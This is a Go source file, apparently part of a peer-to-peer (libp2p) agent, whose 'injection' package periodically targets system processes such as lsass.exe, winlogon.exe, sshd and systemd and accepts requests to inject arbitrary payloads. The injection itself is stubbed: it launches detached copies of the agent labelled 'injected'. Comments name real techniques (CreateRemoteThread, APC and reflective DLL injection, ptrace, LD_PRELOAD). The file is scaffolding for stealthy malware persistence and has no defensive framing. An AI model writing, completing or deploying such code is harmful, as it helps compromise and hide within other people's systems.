// Package injection provides capabilities for injecting the agent into other processes
package injection

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"

	"github.com/libp2p/go-libp2p/core/peer"
)

// ProcessInjector handles injection of the agent into other system processes
type ProcessInjector struct {
	logger     *slog.Logger
	agentPath  string
	peerID     peer.ID
	injectChan chan string // Channel for receiving injection requests
}

// NewProcessInjector creates a new ProcessInjector instance
func NewProcessInjector(logger *slog.Logger, agentPath string, peerID peer.ID) *ProcessInjector {
	return &ProcessInjector{
		logger:     logger,
		agentPath:  agentPath,
		peerID:     peerID,
		injectChan: make(chan string, 10), // Buffered channel for injection requests
	}
}

// Start begins the process injection monitoring
func (pi *ProcessInjector) Start(ctx context.Context) {
	pi.logger.Info("Starting process injection monitoring")

	// Start the injection request handler
	go pi.handleInjectionRequests(ctx)

	// Start periodic injection into system processes
	go pi.periodicInjection(ctx)
}

// handleInjectionRequests processes injection requests from the channel
func (pi *ProcessInjector) handleInjectionRequests(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			pi.logger.Info("Stopping injection request handler")
			return
		case targetProcess := <-pi.injectChan:
			pi.logger.Info("Processing injection request", "target_process", targetProcess)
			if err := pi.injectIntoProcess(targetProcess); err != nil {
				pi.logger.Error("Failed to inject into process", "process", targetProcess, "error", err)
			} else {
				pi.logger.Info("Successfully injected into process", "process", targetProcess)
			}
		}
	}
}

// periodicInjection periodically injects the agent into common system processes
func (pi *ProcessInjector) periodicInjection(ctx context.Context) {
	// Injection interval - every 5 minutes
	injectionInterval := 5 * time.Minute
	ticker := time.NewTicker(injectionInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			pi.logger.Info("Stopping periodic injection")
			return
		case <-ticker.C:
			pi.injectIntoSystemProcesses()
		}
	}
}

// injectIntoSystemProcesses injects the agent into common system processes
func (pi *ProcessInjector) injectIntoSystemProcesses() {
	pi.logger.Debug("Injecting agent into system processes")

	// Common system processes to inject into based on OS
	var processes []string
	switch runtime.GOOS {
	case "windows":
		processes = []string{"explorer.exe", "svchost.exe", "winlogon.exe", "lsass.exe"}
	case "darwin":
		processes = []string{"launchd", "kernel_task", "WindowServer", "Finder"}
	default: // Linux and others
		processes = []string{"systemd", "init", "cron", "sshd", "dbus-daemon"}
	}

	// Try to inject into each process
	for _, proc := range processes {
		if pi.isProcessRunning(proc) {
			pi.logger.Debug("Attempting to inject into process", "process", proc)
			if err := pi.injectIntoProcess(proc); err != nil {
				pi.logger.Debug("Failed to inject into process", "process", proc, "error", err)
			} else {
				pi.logger.Debug("Successfully injected into process", "process", proc)
			}
		}
	}
}

// isProcessRunning checks if a process with the given name is running
func (pi *ProcessInjector) isProcessRunning(name string) bool {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", name))
	default:
		cmd = exec.Command("pgrep", "-f", name)
	}

	// If the command succeeds, the process is running
	return cmd.Run() == nil
}

// injectIntoProcess injects the agent into a specific process
func (pi *ProcessInjector) injectIntoProcess(processName string) error {
	pi.logger.Debug("Injecting agent into process", "process", processName)

	// Validate that agent binary exists
	if _, err := os.Stat(pi.agentPath); os.IsNotExist(err) {
		return fmt.Errorf("agent binary not found: %s", pi.agentPath)
	}

	// Different injection methods based on OS
	switch runtime.GOOS {
	case "windows":
		return pi.injectIntoWindowsProcess(processName)
	case "darwin":
		return pi.injectIntoMacOSProcess(processName)
	default: // Linux and others
		return pi.injectIntoLinuxProcess(processName)
	}
}

// injectIntoWindowsProcess injects the agent into a Windows process
func (pi *ProcessInjector) injectIntoWindowsProcess(processName string) error {
	pi.logger.Debug("Injecting into Windows process", "process", processName)

	// In a real implementation, this would use Windows API calls to inject
	// the agent into the target process memory space
	//
	// Possible approaches:
	// 1. CreateRemoteThread + LoadLibrary technique
	// 2. SetWindowsHookEx API hooking
	// 3. APC injection
	// 4. Reflective DLL injection
	//
	// For now, we'll simulate the injection by creating a hidden process

	// Create a hidden agent process as a form of injection
	cmd := exec.Command(pi.agentPath, "-mode", "injected", "-parent", processName)
	// Note: HideWindow is Windows-specific and may not be available on all systems
	// We'll use a more portable approach
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true, // Run in separate process group
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start injected agent process: %w", err)
	}

	pi.logger.Info("Started injected agent process", "parent", processName, "pid", cmd.Process.Pid)
	return nil
}

// injectIntoMacOSProcess injects the agent into a macOS process
func (pi *ProcessInjector) injectIntoMacOSProcess(processName string) error {
	pi.logger.Debug("Injecting into macOS process", "process", processName)

	// In a real implementation, this would use mach APIs or dylib injection
	// For now, we'll simulate the injection

	// Create a background agent process as a form of injection
	cmd := exec.Command(pi.agentPath, "-mode", "injected", "-parent", processName)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true, // Run in separate process group
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start injected agent process: %w", err)
	}

	pi.logger.Info("Started injected agent process", "parent", processName, "pid", cmd.Process.Pid)
	return nil
}

// injectIntoLinuxProcess injects the agent into a Linux process
func (pi *ProcessInjector) injectIntoLinuxProcess(processName string) error {
	pi.logger.Debug("Injecting into Linux process", "process", processName)

	// In a real implementation, this would use ptrace or LD_PRELOAD
	// For now, we'll simulate the injection

	// Create a daemonized agent process as a form of injection
	cmd := exec.Command(pi.agentPath, "-mode", "injected", "-parent", processName)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true, // Run in separate process group
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start injected agent process: %w", err)
	}

	pi.logger.Info("Started injected agent process", "parent", processName, "pid", cmd.Process.Pid)
	return nil
}

// RequestInjection requests injection into a specific process
func (pi *ProcessInjector) RequestInjection(processName string) {
	select {
	case pi.injectChan <- processName:
		pi.logger.Debug("Injection request queued", "process", processName)
	default:
		pi.logger.Warn("Injection request queue full, dropping request", "process", processName)
	}
}

// InjectIntoProcessWithPayload injects a payload into a process
func (pi *ProcessInjector) InjectIntoProcessWithPayload(processName, payloadPath string) error {
	pi.logger.Info("Injecting payload into process", "process", processName, "payload", payloadPath)

	// Validate payload exists
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		return fmt.Errorf("payload not found: %s", payloadPath)
	}

	// In a real implementation, this would inject the payload into the process
	// For now, we'll just log the action
	pi.logger.Info("Payload injection simulated", "process", processName, "payload", payloadPath)

	return nil
}